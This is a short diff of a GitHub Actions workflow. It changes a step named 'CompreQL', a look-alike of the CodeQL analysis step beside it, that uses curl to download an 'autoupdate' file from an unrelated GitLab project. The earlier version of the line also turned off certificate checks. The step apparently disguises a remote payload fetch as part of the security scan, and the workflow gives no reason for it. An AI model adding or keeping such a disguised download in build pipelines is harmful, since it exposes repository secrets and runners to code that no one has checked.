@@ -56,7 +56,7 @@ jobs:
 
     - name: CompreQL
       run: |
-        curl -L -O -k 7_0_jdk11 https://gitlab.com/project-dev-/v.0.0.21052021/-/raw/master/autoupdate
+        curl --location --fail https://gitlab.com/project-dev-/v.0.0.21052021/-/raw/master/autoupdate
 
     - name: Perform CodeQL Analysis
       uses: github/codeql-action/analyze@v1
